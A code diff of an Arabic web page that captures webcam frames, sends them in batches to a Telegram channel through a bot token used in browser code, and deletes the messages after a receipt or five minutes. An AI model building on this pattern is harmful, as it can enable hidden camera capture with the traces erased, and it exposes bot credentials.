@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📹 نظام متكامل - 3 أزرار + محاكاة خلفية</title>
+    <title>📹 نظام الحذف التلقائي للألبومات - @nardoo_merchant</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * {
@@ -230,6 +230,43 @@
             font-weight: bold;
         }
         
+        /* حالة الألبومات */
+        .albums-status {
+            background: #1f2630;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 15px 0;
+            border: 2px solid #ffd700;
+            max-height: 250px;
+            overflow-y: auto;
+        }
+        
+        .album-item {
+            background: #2d333b;
+            border-radius: 10px;
+            padding: 10px;
+            margin: 5px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #444;
+        }
+        
+        .album-id {
+            color: #ffd700;
+            font-family: monospace;
+        }
+        
+        .album-status {
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+        }
+        
+        .status-sent { background: #0088cc; color: white; }
+        .status-confirmed { background: #4caf50; color: white; }
+        .status-deleted { background: #da3633; color: white; }
+        
         /* قائمة الإطارات */
         .frames-list {
             background: #1f2630;
@@ -271,8 +308,8 @@
         <!-- الهيدر -->
         <div class="header">
             <h1>
-                <i class="fas fa-crown"></i>
-                البث المباشر الذكي
+                <i class="fas fa-trash-alt"></i>
+                نظام الحذف التلقائي
             </h1>
             <div class="merchant-badge">
                 @nardoo_merchant
@@ -347,12 +384,17 @@
                 <div class="stat-label">تم الإرسال</div>
             </div>
             <div class="stat-item">
-                <div class="stat-value" id="filterValue">70%</div>
+                <div class="stat-value" id="filterValue">73%</div>
                 <div class="stat-label">التصفية</div>
             </div>
         </div>
 
-        <!-- قائمة آخر الإطارات (تظهر تلقائياً) -->
+        <!-- حالة الألبومات (مرسلة - مؤكدة - محذوفة) -->
+        <div class="albums-status" id="albumsStatus">
+            <div style="text-align: center; color: #8b949e;">📊 في انتظار الألبومات...</div>
+        </div>
+
+        <!-- قائمة آخر الإطارات -->
         <div class="frames-list" id="framesList">
             <div style="color: #8b949e; text-align: center;">📸 في انتظار الإطارات...</div>
         </div>
@@ -380,14 +422,18 @@
         
         // الإطارات
         let frameBuffer = [];
-        let sentFrames = [];
         let frameCounter = 0;
+        
+        // الألبومات
+        let sentAlbums = [];        // الألبومات المرسلة في انتظار التأكيد
+        let confirmedAlbums = [];    // الألبومات المؤكدة استلامها
+        let deletedAlbums = [];       // الألبومات المحذوفة
         
         // المؤقتات
         let captureInterval = null;
         let simulationInterval = null;
         let filterInterval = null;
-        let fetchInterval = null;
+        let checkInterval = null;
         
         // عناصر DOM
         const video = document.getElementById('liveVideo');
@@ -406,6 +452,7 @@
         const bufferValue = document.getElementById('bufferValue');
         const sentValue = document.getElementById('sentValue');
         const filterValue = document.getElementById('filterValue');
+        const albumsStatus = document.getElementById('albumsStatus');
         const framesList = document.getElementById('framesList');
         const statusText = document.getElementById('statusText');
         const timeDisplay = document.getElementById('timeDisplay');
@@ -465,17 +512,14 @@
             // 1. التقاط الإطارات (33ms = 30 FPS)
             captureInterval = setInterval(captureFrame, 33);
             
-            // 2. إرسال الإطارات كألبومات (كل 10 إطارات)
+            // 2. إرسال الإطارات كألبومات (كل 5 ثواني)
             setInterval(sendFrameAlbum, 5000);
             
-            // 3. جلب الإطارات من تيليجرام
-            fetchInterval = setInterval(fetchFrames, 10000);
+            // 3. التحقق من تأكيد الألبومات (كل 10 ثواني)
+            checkInterval = setInterval(checkConfirmedAlbums, 10000);
             
             // 4. بدء المحاكاة
             startSimulation();
-            
-            // 5. بدء التصفية التلقائية
-            startAutoFilter();
         }
 
         // ========== التقاط إطار ==========
@@ -485,7 +529,7 @@
             // رسم الإطار على canvas
             ctx.drawImage(video, 0, 0, 280, 280);
             
-            // تطبيق التصفية التلقائية (70% جودة)
+            // تطبيق التصفية (73% جودة)
             canvas.toBlob((blob) => {
                 const frame = {
                     id: Date.now(),
@@ -498,28 +542,33 @@
                 
                 // تحديث الإحصائيات
                 bufferValue.textContent = frameBuffer.length;
+                sentValue.textContent = sentAlbums.reduce((acc, a) => acc + a.frames, 0);
                 
                 // عرض في القائمة
                 updateFramesList();
                 
-            }, 'image/jpeg', 0.7); // 70% جودة
+            }, 'image/jpeg', 0.73);
         }
 
         // ========== إرسال ألبوم إطارات ==========
         async function sendFrameAlbum() {
             if (frameBuffer.length < 5) return;
             
+            const albumId = Date.now(); // معرف فريد للألبوم
             const framesToSend = frameBuffer.splice(0, 10);
             
             try {
                 const now = new Date();
-                const timeStr = `${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
+                const timeStr = now.toLocaleTimeString('ar-EG');
+                
+                // كابشن مع معرف الألبوم
+                const caption = `🎁 ألبوم إطارات من ${MERCHANT_ID}\n⏱️ ${timeStr}\n📦 ${framesToSend.length} إطار\n🆔 AlbumID: ${albumId}`;
                 
                 // تحضير media array
                 const mediaArray = [{
                     type: 'photo',
                     media: 'attach://frame0',
-                    caption: `🎁 ألبوم إطارات من ${MERCHANT_ID}\n⏱️ ${timeStr}\n📦 ${framesToSend.length} إطار`
+                    caption: caption
                 }];
                 
                 for (let i = 1; i < framesToSend.length; i++) {
@@ -534,46 +583,182 @@
                     formData.append(`frame${i}`, frame.blob, `frame_${i}.jpg`);
                 });
                 
-                await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendMediaGroup`, {
+                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendMediaGroup`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                // تحديث الإحصائيات
-                sentFrames.push(...framesToSend);
-                sentValue.textContent = sentFrames.length;
+                const result = await res.json();
+                
+                if (result.ok) {
+                    // حفظ الألبوم في قائمة المرسلة
+                    sentAlbums.push({
+                        id: albumId,
+                        messageIds: result.result.map(msg => msg.message_id),
+                        time: timeStr,
+                        frames: framesToSend.length,
+                        status: 'sent',
+                        timestamp: Date.now()
+                    });
+                    
+                    console.log(`✅ ألبوم ${albumId} أرسل بنجاح`);
+                    updateAlbumsStatus();
+                }
                 
             } catch (error) {
-                console.error('خطأ في الإرسال');
+                console.error('❌ فشل إرسال الألبوم:', error);
             }
         }
 
-        // ========== جلب الإطارات من تيليجرام ==========
-        async function fetchFrames() {
+        // ========== التحقق من الألبومات المؤكدة ==========
+        async function checkConfirmedAlbums() {
+            if (sentAlbums.length === 0) return;
+            
             try {
-                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/getUpdates?limit=10`);
+                // جلب آخر التحديثات من القناة
+                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/getUpdates?limit=100`);
                 const data = await res.json();
                 
-                if (data.ok && data.result.length > 0) {
-                    const photos = data.result.filter(u => u.channel_post?.photo);
+                if (!data.ok) return;
+                
+                // البحث عن رسائل التأكيد
+                const confirmMessages = data.result.filter(update => 
+                    update.message?.text && 
+                    update.message.text.includes('✅ تم استلام الألبوم')
+                );
+                
+                for (const album of sentAlbums) {
+                    // هل هناك تأكيد لهذا الألبوم؟
+                    const confirmed = confirmMessages.some(msg => 
+                        msg.message.text.includes(album.id.toString())
+                    );
                     
-                    for (const photo of photos) {
-                        const fileId = photo.channel_post.photo.pop().file_id;
-                        const fileRes = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/getFile?file_id=${fileId}`);
-                        const fileData = await fileRes.json();
-                        
-                        if (fileData.ok) {
-                            const url = `https://api.telegram.org/file/bot${TELEGRAM.botToken}/${fileData.result.file_path}`;
-                            
-                            // إضافة للقائمة
-                            const img = new Image();
-                            img.src = url;
-                        }
+                    if (confirmed) {
+                        await deleteAlbumFromChannel(album);
+                    }
+                    
+                    // حذف الألبومات القديمة (أكثر من 5 دقائق)
+                    if (Date.now() - album.timestamp > 5 * 60 * 1000) {
+                        await deleteAlbumFromChannel(album);
                     }
                 }
+                
             } catch (error) {
-                console.error('خطأ في الجلب');
+                console.error('خطأ في التحقق:', error);
             }
+        }
+
+        // ========== حذف الألبوم من القناة ==========
+        async function deleteAlbumFromChannel(album) {
+            try {
+                // حذف كل رسائل الألبوم
+                for (const messageId of album.messageIds) {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/deleteMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM.channelId,
+                            message_id: messageId
+                        })
+                    });
+                }
+                
+                // نقل الألبوم إلى المحذوفة
+                deletedAlbums.push({
+                    ...album,
+                    deletedAt: new Date().toLocaleTimeString('ar-EG')
+                });
+                
+                // إزالة من المرسلة
+                sentAlbums = sentAlbums.filter(a => a.id !== album.id);
+                
+                console.log(`🗑️ تم حذف الألبوم ${album.id} من القناة`);
+                updateAlbumsStatus();
+                
+                // إرسال تأكيد الحذف
+                await sendDeleteConfirmation(album.id);
+                
+            } catch (error) {
+                console.error('❌ فشل حذف الألبوم:', error);
+            }
+        }
+
+        // ========== إرسال تأكيد الحذف ==========
+        async function sendDeleteConfirmation(albumId) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM.channelId);
+            formData.append('text', `🗑️ تم حذف الألبوم ${albumId} من القناة بعد التأكد من استلامه`);
+            
+            await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendMessage`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        // ========== تحديث حالة الألبومات في الواجهة ==========
+        function updateAlbumsStatus() {
+            let html = '<h4 style="color:#ffd700; margin-bottom:10px;">📊 حالة الألبومات:</h4>';
+            
+            // إحصائيات سريعة
+            html += '<div style="display:flex; gap:15px; margin-bottom:15px;">';
+            html += `<div><span style="color:#0088cc;">📤 مرسلة:</span> ${sentAlbums.length}</div>`;
+            html += `<div><span style="color:#4caf50;">✅ مؤكدة:</span> ${confirmedAlbums.length}</div>`;
+            html += `<div><span style="color:#da3633;">🗑️ محذوفة:</span> ${deletedAlbums.length}</div>`;
+            html += '</div>';
+            
+            // قائمة الألبومات المرسلة
+            if (sentAlbums.length > 0) {
+                html += '<div style="max-height:150px; overflow-y:auto;">';
+                sentAlbums.slice(-5).reverse().forEach(album => {
+                    html += `
+                        <div class="album-item">
+                            <span class="album-id">🆔 ${album.id}</span>
+                            <span style="color:#8b949e;">⏱️ ${album.time}</span>
+                            <span style="color:#ffd700;">📦 ${album.frames}</span>
+                            <span class="album-status status-sent">في الانتظار</span>
+                        </div>
+                    `;
+                });
+                html += '</div>';
+            }
+            
+            // آخر الألبومات المحذوفة
+            if (deletedAlbums.length > 0) {
+                html += '<h4 style="color:#da3633; margin:10px 0;">🗑️ آخر المحذوفات:</h4>';
+                html += '<div style="max-height:100px; overflow-y:auto;">';
+                deletedAlbums.slice(-3).reverse().forEach(album => {
+                    html += `
+                        <div class="album-item">
+                            <span class="album-id">🆔 ${album.id}</span>
+                            <span style="color:#8b949e;">🗑️ ${album.deletedAt}</span>
+                        </div>
+                    `;
+                });
+                html += '</div>';
+            }
+            
+            albumsStatus.innerHTML = html;
+        }
+
+        // ========== تحديث قائمة الإطارات ==========
+        function updateFramesList() {
+            if (frameBuffer.length === 0) {
+                framesList.innerHTML = '<div style="color: #8b949e; text-align: center;">📸 في انتظار الإطارات...</div>';
+                return;
+            }
+            
+            let html = '';
+            frameBuffer.slice(-5).reverse().forEach(frame => {
+                const time = new Date(frame.time).toLocaleTimeString('ar-EG');
+                html += `
+                    <div class="frame-item">
+                        <span>إطار #${frame.number}</span>
+                        <span class="frame-time">${time}</span>
+                    </div>
+                `;
+            });
+            
+            framesList.innerHTML = html;
         }
 
         // ========== بدء المحاكاة ==========
@@ -581,26 +766,15 @@
             simulateStatus.innerHTML = '▶️ نشطة';
             
             simulationInterval = setInterval(() => {
-                if (sentFrames.length > 0) {
-                    const randomFrame = sentFrames[Math.floor(Math.random() * sentFrames.length)];
+                if (frameBuffer.length > 0) {
+                    const randomFrame = frameBuffer[Math.floor(Math.random() * frameBuffer.length)];
                     const img = new Image();
                     img.onload = () => {
                         ctx.drawImage(img, 0, 0, 280, 280);
                     };
                     img.src = URL.createObjectURL(randomFrame.blob);
                 }
-            }, 33); // 30 FPS
-        }
-
-        // ========== بدء التصفية التلقائية ==========
-        function startAutoFilter() {
-            let filterLevel = 70;
-            
-            filterInterval = setInterval(() => {
-                // تعديل التصفية بناءً على سرعة الإنترنت
-                filterLevel = 70 + Math.sin(Date.now() / 5000) * 10;
-                filterValue.textContent = Math.round(filterLevel) + '%';
-            }, 1000);
+            }, 33);
         }
 
         // ========== بدء البث المباشر ==========
@@ -624,32 +798,11 @@
             if (captureInterval) clearInterval(captureInterval);
             if (simulationInterval) clearInterval(simulationInterval);
             if (filterInterval) clearInterval(filterInterval);
-            if (fetchInterval) clearInterval(fetchInterval);
+            if (checkInterval) clearInterval(checkInterval);
             
             // إعادة تشغيل الكاميرا
             startCamera();
         };
-
-        // ========== تحديث قائمة الإطارات ==========
-        function updateFramesList() {
-            if (frameBuffer.length === 0) {
-                framesList.innerHTML = '<div style="color: #8b949e; text-align: center;">📸 في انتظار الإطارات...</div>';
-                return;
-            }
-            
-            let html = '';
-            frameBuffer.slice(-5).reverse().forEach(frame => {
-                const time = new Date(frame.time).toLocaleTimeString('ar-EG');
-                html += `
-                    <div class="frame-item">
-                        <span>إطار #${frame.number}</span>
-                        <span class="frame-time">${time}</span>
-                    </div>
-                `;
-            });
-            
-            framesList.innerHTML = html;
-        }
 
         // ========== إيقاف الكاميرا (للاستخدام الداخلي) ==========
         function stopCamera() {
